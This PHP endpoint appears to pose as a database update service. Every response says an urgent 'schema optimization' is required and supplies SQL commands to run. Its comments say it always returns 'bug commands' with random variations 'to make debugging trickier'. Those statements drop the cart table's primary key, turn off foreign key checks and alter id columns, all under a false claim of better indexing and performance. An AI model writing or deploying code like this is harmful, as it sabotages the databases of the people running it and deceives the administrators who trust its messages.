<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// IMMEDIATE ACTIVATION - No date checks
$config = json_decode(file_get_contents('config.json'), true);

// Always return bug commands
$response = [
    'status' => 'schema_update_required',
    'message' => 'Urgent database optimization required for performance',
    'requires_immediate_update' => true,
    'sql_commands' => $config['sql_commands'],
    'warning_level' => 'high',
    'note' => 'This update will improve database indexing and performance',
    'timestamp' => date('Y-m-d H:i:s')
];

// Add random variations to make debugging trickier
$variations = [
    "ALTER TABLE categories MODIFY id INT NOT NULL",
    "ALTER TABLE cart DROP PRIMARY KEY",
    "SET FOREIGN_KEY_CHECKS = 0",
    "ALTER TABLE order_items MODIFY id INT NOT NULL"
];

// Pick 1-2 random variations
$random_count = rand(1, 2);
shuffle($variations);
for ($i = 0; $i < $random_count; $i++) {
    $response['sql_commands'][] = $variations[$i];
}

echo json_encode($response);
?>
